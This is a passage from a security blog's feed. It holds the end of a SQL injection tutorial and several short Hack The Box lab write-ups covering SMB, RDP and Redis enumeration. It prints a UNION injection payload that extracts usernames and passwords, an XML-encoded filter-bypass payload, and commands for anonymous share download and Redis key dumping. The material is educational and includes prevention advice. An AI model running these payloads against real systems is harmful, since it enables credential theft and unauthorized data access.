+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;description&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;products&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;WHERE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;category&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Gifts&amp;#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;then an attacker can submit the input:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;UNION&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;users&lt;/span&gt;&lt;span class="c1"&gt;--&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;This will cause the application to return all usernames and passwords along with the names and descriptions of products.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Read more&lt;/strong&gt;
+* [[SQL injection UNION attacks]]&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;hr&gt;
+&lt;h3&gt;Blind SQL injection vulnerabilities&lt;/h3&gt;
+&lt;p&gt;Many instances of SQL injection are blind vulnerabilities. This means that the application does not return the results of the SQL query or the details of any database errors within its responses. Blind vulnerabilities can still be exploited to access unauthorized data, but the techniques involved are generally more complicated and difficult to perform.
+Depending on the nature of the vulnerability and the database involved, the following techniques can be used to exploit blind SQL injection vulnerabilities:
+* You can change the logic of the query to trigger a detectable difference in the application's response depending on the truth of a single condition. This might involve injecting a new condition into some Boolean logic, or conditionally triggering an error such as a divide-by-zero.
+* You can conditionally trigger a time delay in the processing of the query, allowing you to infer the truth of the condition based on the time that the application takes to respond.
+* You can trigger an out-of-band network interaction, using OAST techniques. This technique is extremely powerful and works in situations where the other techniques do not. Often, you can directly exfiltrate data via the out-of-band channel, for example by placing the data into a DNS lookup for a domain that you control.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Read more&lt;/strong&gt;
+* &lt;a href="https://portswigger.net/web-security/sql-injection/blind"&gt;Blind SQL injection&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;hr&gt;
+&lt;h3&gt;Second-order SQL injection&lt;/h3&gt;
+&lt;p&gt;First-order SQL injection arises where the application takes user input from an HTTP request and, in the course of processing that request, incorporates the input into a SQL query in an unsafe way.
+In second-order SQL injection (also known as stored SQL injection), the application takes user input from an HTTP request and stores it for future use. This is usually done by placing the input into a database, but no vulnerability arises at the point where the data is stored. Later, when handling a different HTTP request, the application retrieves the stored data and incorporates it into a SQL query in an unsafe way.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Photo" src="https://sfinx.kozow.com/2024/5/19/sql-injection/SQLI/image 2.jpg"&gt;&lt;/p&gt;
+&lt;p&gt;Second-order SQL injection often arises in situations where developers are aware of SQL injection vulnerabilities, and so safely handle the initial placement of the input into the database. When the data is later processed, it is deemed to be safe, since it was previously placed into the database safely. At this point, the data is handled in an unsafe way, because the developer wrongly deems it to be trusted.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3&gt;Examining the database&lt;/h3&gt;
+&lt;p&gt;Some core features of the SQL language are implemented in the same way across popular database platforms, and so many ways of detecting and exploiting SQL injection vulnerabilities work identically on different types of database.
+However, there are also many differences between common databases. These mean that some techniques for detecting and exploiting SQL injection work differently on different platforms. For example:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Syntax for string concatenation.&lt;/li&gt;
+&lt;li&gt;Comments.&lt;/li&gt;
+&lt;li&gt;Batched (or stacked) queries.&lt;/li&gt;
+&lt;li&gt;Platform-specific APIs.&lt;/li&gt;
+&lt;li&gt;Error messages.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Read more&lt;/strong&gt;
+* &lt;a href="https://portswigger.net/web-security/sql-injection/cheat-sheet"&gt;SQL injection cheat sheet&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Following initial identification of a SQL injection vulnerability, it is generally useful to obtain some information about the database itself. This information can often pave the way for further exploitation.
+You can query the version details for the database. The way that this is done depends on the database type, so you can infer the database type from whichever technique works. For example, on Oracle you can execute:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;v$version&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;You can also determine what database tables exist, and which columns they contain. For example, on most databases you can execute the following query to list the tables:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;information_schema&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tables&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Read more&lt;/strong&gt;
+* [[Examining the database in SQL injection attacks]]
+* [[SQL injection cheat sheet]]&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;hr&gt;
+&lt;h3&gt;SQL injection in different contexts&lt;/h3&gt;
+&lt;p&gt;In all of the labs so far, you've used the query string to inject your malicious SQL payload. However, it's important to note that you can perform SQL injection attacks using any controllable input that is processed as a SQL query by the application. For example, some websites take input in JSON or XML format and use this to query the database.
+These different formats may even provide alternative ways for you to &lt;a href="https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings#obfuscation-via-xml-encoding"&gt;obfuscate attacks&lt;/a&gt; that are otherwise blocked due to WAFs and other defense mechanisms. Weak implementations often just look for common SQL injection keywords within the request, so you may be able to bypass these filters by simply encoding or escaping characters in the prohibited keywords. For example, the following XML-based SQL injection uses an XML escape sequence to encode the ==S== character in ==SELECT==:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nt"&gt;&amp;lt;stockCheck&amp;gt;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;productId&amp;gt;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;123
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;/productId&amp;gt;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;storeId&amp;gt;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;999&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ni"&gt;&amp;amp;#x53;&lt;/span&gt;ELECT&lt;span class="w"&gt; &lt;/span&gt;*&lt;span class="w"&gt; &lt;/span&gt;FROM&lt;span class="w"&gt; &lt;/span&gt;information_schema.tables
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;/storeId&amp;gt;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;/stockCheck&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;This will be decoded server-side before being passed to the SQL interpreter.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style="text-align: center;"&gt;🧪LAB APPRENTICE&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center;"&gt;&lt;a href="https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding"&gt;SQL injection with filter bypass via XML encoding&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;hr&gt;
+&lt;h3&gt;How to prevent SQL injection&lt;/h3&gt;
+&lt;p&gt;Most instances of SQL injection can be prevented by using parameterized queries (also known as prepared statements) instead of string concatenation within the query.
+The following code is vulnerable to SQL injection because the user input is concatenated directly into the query:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;SELECT * FROM products WHERE category = &amp;#39;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;input&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;Statement&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;statement&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;connection&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;createStatement&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;ResultSet&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;resultSet&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;statement&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;executeQuery&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;This code can be easily rewritten in a way that prevents the user input from interfering with the query structure:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;PreparedStatement&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;statement&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;connection&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;prepareStatement&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;SELECT * FROM products WHERE category = ?&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;statement&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setString&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;input&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;ResultSet&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;resultSet&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;statement&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;executeQuery&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Parameterized queries can be used for any situation where untrusted input appears as data within the query, including the ==WHERE== clause and values in an ==INSERT== or ==UPDATE== statement. They can't be used to handle untrusted input in other parts of the query, such as table or column names, or the ==ORDER BY== clause. Application functionality that places untrusted data into those parts of the query will need to take a different approach, such as white-listing permitted input values, or using different logic to deliver the required behavior.
+For a parameterized query to be effective in preventing SQL injection, the string that is used in the query must always be a hard-coded constant, and must never contain any variable data from any origin. Do not be tempted to decide case-by-case whether an item of data is trusted, and continue using string concatenation within the query for cases that are considered safe. It is all too easy to make mistakes about the possible origin of data, or for changes in other code to violate assumptions about what data is tainted.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Read more
+* &lt;a href="https://portswigger.net/burp/vulnerability-scanner"&gt;Find SQL injection vulnerabilities using Burp Suite's web vulnerability scanner&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;</content><category term="PortSwigger"></category></entry><entry><title>Dancing Machine</title><link href="https://sfinx.kozow.com/2024/5/19/dancing/" rel="alternate"></link><published>2024-05-19T19:10:00+01:00</published><updated>2024-05-19T19:10:00+01:00</updated><author><name>MedSecure</name></author><id>tag:sfinx.kozow.com,2024-05-19:/2024/5/19/dancing/</id><summary type="html">&lt;h1&gt;Dancing Machine&lt;/h1&gt;
+&lt;h1&gt;HTB/STARTING_POINT&lt;/h1&gt;
+&lt;p&gt;In this machine we learn to enumerate SMB file shares.&lt;/p&gt;
+&lt;h3&gt;To list shares&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$&lt;span class="w"&gt; &lt;/span&gt;smbclient&lt;span class="w"&gt; &lt;/span&gt;-L&lt;span class="w"&gt; &lt;/span&gt;//&amp;lt;serverIP/name&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;-N
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3&gt;To download all file to a backup file become handing when u have a large file system&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$&lt;span class="w"&gt; &lt;/span&gt;smbclient&lt;span class="w"&gt; &lt;/span&gt;//&amp;lt;serverIP/name&amp;gt;/&amp;lt;shareDisk&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;-N&lt;span class="w"&gt; &lt;/span&gt;-Tc&lt;span class="w"&gt; &lt;/span&gt;backup …&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;h1&gt;Dancing Machine&lt;/h1&gt;
+&lt;h1&gt;HTB/STARTING_POINT&lt;/h1&gt;
+&lt;p&gt;In this machine we learn to enumerate SMB file shares.&lt;/p&gt;
+&lt;h3&gt;To list shares&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$&lt;span class="w"&gt; &lt;/span&gt;smbclient&lt;span class="w"&gt; &lt;/span&gt;-L&lt;span class="w"&gt; &lt;/span&gt;//&amp;lt;serverIP/name&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;-N
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3&gt;To download all file to a backup file become handing when u have a large file system&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$&lt;span class="w"&gt; &lt;/span&gt;smbclient&lt;span class="w"&gt; &lt;/span&gt;//&amp;lt;serverIP/name&amp;gt;/&amp;lt;shareDisk&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;-N&lt;span class="w"&gt; &lt;/span&gt;-Tc&lt;span class="w"&gt; &lt;/span&gt;backup.tar
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content><category term="HTB"></category></entry><entry><title>Explosion Machine</title><link href="https://sfinx.kozow.com/2024/5/19/explosion/" rel="alternate"></link><published>2024-05-19T19:10:00+01:00</published><updated>2024-05-19T19:10:00+01:00</updated><author><name>MedSecure</name></author><id>tag:sfinx.kozow.com,2024-05-19:/2024/5/19/explosion/</id><content type="html">&lt;h1&gt;Explosion&lt;/h1&gt;
+&lt;h1&gt;HTB/STARTING_POINT&lt;/h1&gt;
+&lt;p&gt;This machine teach you how to interact with RDP protocol and enumerate it .&lt;/p&gt;
+&lt;p&gt;Let’s start by map to scan all open ports, since this machine is focused on RDP , we will reduce time by specifying the port on 3389 ;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content><category term="HTB"></category></entry><entry><title>Redeemer Machine</title><link href="https://sfinx.kozow.com/2024/5/19/redeemer/" rel="alternate"></link><published>2024-05-19T19:10:00+01:00</published><updated>2024-05-19T19:10:00+01:00</updated><author><name>MedSecure</name></author><id>tag:sfinx.kozow.com,2024-05-19:/2024/5/19/redeemer/</id><summary type="html">&lt;h1&gt;Redeemer&lt;/h1&gt;
+&lt;h1&gt;HTB/STARTING_POINT&lt;/h1&gt;
+&lt;p&gt;This machine show you how to interact with a Redis server .&lt;/p&gt;
+&lt;p&gt;Doing Nmap scan show open port and specifically redid port open on :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$&lt;span class="w"&gt; &lt;/span&gt;nmap&lt;span class="w"&gt; &lt;/span&gt;-sC&lt;span class="w"&gt; &lt;/span&gt;-sV&lt;span class="w"&gt; &lt;/span&gt;-T4&lt;span class="w"&gt; &lt;/span&gt;-p-&lt;span class="w"&gt; &lt;/span&gt;-oA&lt;span class="w"&gt; &lt;/span&gt;nmap/Redeemer&lt;span class="w"&gt; &lt;/span&gt;&amp;lt;serverIp&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Result :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;# &lt;/span&gt;Nmap&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;.93&lt;span class="w"&gt; &lt;/span&gt;scan&lt;span class="w"&gt; &lt;/span&gt;initiated&lt;span class="w"&gt; &lt;/span&gt;Thu&lt;span class="w"&gt; &lt;/span&gt;Aug&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;24&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;02&lt;/span&gt;:07:23&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;2023 …&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;h1&gt;Redeemer&lt;/h1&gt;
+&lt;h1&gt;HTB/STARTING_POINT&lt;/h1&gt;
+&lt;p&gt;This machine show you how to interact with a Redis server .&lt;/p&gt;
+&lt;p&gt;Doing Nmap scan show open port and specifically redid port open on :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$&lt;span class="w"&gt; &lt;/span&gt;nmap&lt;span class="w"&gt; &lt;/span&gt;-sC&lt;span class="w"&gt; &lt;/span&gt;-sV&lt;span class="w"&gt; &lt;/span&gt;-T4&lt;span class="w"&gt; &lt;/span&gt;-p-&lt;span class="w"&gt; &lt;/span&gt;-oA&lt;span class="w"&gt; &lt;/span&gt;nmap/Redeemer&lt;span class="w"&gt; &lt;/span&gt;&amp;lt;serverIp&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Result :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;# &lt;/span&gt;Nmap&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;.93&lt;span class="w"&gt; &lt;/span&gt;scan&lt;span class="w"&gt; &lt;/span&gt;initiated&lt;span class="w"&gt; &lt;/span&gt;Thu&lt;span class="w"&gt; &lt;/span&gt;Aug&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;24&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;02&lt;/span&gt;:07:23&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;2023&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;as:&lt;span class="w"&gt; &lt;/span&gt;nmap&lt;span class="w"&gt; &lt;/span&gt;-sC&lt;span class="w"&gt; &lt;/span&gt;-sV&lt;span class="w"&gt; &lt;/span&gt;-T4&lt;span class="w"&gt; &lt;/span&gt;-p-&lt;span class="w"&gt; &lt;/span&gt;-oA&lt;span class="w"&gt; &lt;/span&gt;nmap/Redeemer&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.129.6.102
+&lt;span class="go"&gt;Warning: 10.129.6.102 giving up on port because retransmission cap hit (6).&lt;/span&gt;
+&lt;span class="go"&gt;Nmap scan report for 10.129.6.102&lt;/span&gt;
+&lt;span class="go"&gt;Host is up (0.11s latency).&lt;/span&gt;
+&lt;span class="go"&gt;Not shown: 65526 closed tcp ports (conn-refused)&lt;/span&gt;
+&lt;span class="go"&gt;PORT      STATE    SERVICE VERSION&lt;/span&gt;
+&lt;span class="go"&gt;6379/tcp  open     redis   Redis key-value store 5.0.7&lt;/span&gt;
+&lt;span class="go"&gt;23201/tcp filtered unknown&lt;/span&gt;
+&lt;span class="go"&gt;23819/tcp filtered unknown&lt;/span&gt;
+&lt;span class="go"&gt;25153/tcp filtered unknown&lt;/span&gt;
+&lt;span class="go"&gt;34008/tcp filtered unknown&lt;/span&gt;
+&lt;span class="go"&gt;35903/tcp filtered unknown&lt;/span&gt;
+&lt;span class="go"&gt;39049/tcp filtered unknown&lt;/span&gt;
+&lt;span class="go"&gt;40140/tcp filtered unknown&lt;/span&gt;
+&lt;span class="go"&gt;47535/tcp filtered unknown&lt;/span&gt;
+
+&lt;span class="go"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
+&lt;span class="gp"&gt;# &lt;/span&gt;Nmap&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;done&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;at&lt;span class="w"&gt; &lt;/span&gt;Thu&lt;span class="w"&gt; &lt;/span&gt;Aug&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;24&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;02&lt;/span&gt;:25:02&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;2023&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;--&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;IP&lt;span class="w"&gt; &lt;/span&gt;address&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;host&lt;span class="w"&gt; &lt;/span&gt;up&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;scanned&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;1059&lt;/span&gt;.07&lt;span class="w"&gt; &lt;/span&gt;seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Connect to redis ;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$&lt;span class="w"&gt; &lt;/span&gt;redis-cli&lt;span class="w"&gt; &lt;/span&gt;-h&lt;span class="w"&gt; &lt;/span&gt;&amp;lt;hostname/ip&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Get all db ;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;redis-cli&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;config&lt;span class="w"&gt; &lt;/span&gt;get&lt;span class="w"&gt; &lt;/span&gt;databases
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Get existed keys with correspond db index;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;redis-cli&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;info&lt;span class="w"&gt; &lt;/span&gt;keyspace&lt;span class="w"&gt; &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Select desired db;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;redis-cli&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;select&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&amp;lt;N&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Get info on Redis server;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;redis-cli&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;info
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Dump all keys;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;redis-cli&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;keys&lt;span class="w"&gt; &lt;/span&gt;*
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Get random keys;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;redis-cli&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;randomkey&lt;span class="w"&gt; &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Print specified key value;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;redis-cli&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;get&lt;span class="w"&gt; &lt;/span&gt;&amp;lt;keyname&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content><category term="HTB"></category></entry><entry><title>Squid Machine</title><link href="https://sfinx.kozow.com/2024/5/19/squid/" rel="alternate"></link><published>2024-05-19T19:10:00+01:00</published><updated>2024-05-19T19:10:00+01:00</updated><author><name>MedSecure</name></author><id>tag:sfinx.kozow.com,2024-05-19:/2024/5/19/squid/</id><summary type="html">&lt;h1&gt;SQUID - MACHINE / PG&lt;/h1&gt;
+&lt;h1&gt;PG/easy_windows&lt;/h1&gt;
+&lt;p&gt;This machine a proxy named squid that proxy all network traffic from outside . It operate on port 3128&lt;/p&gt;
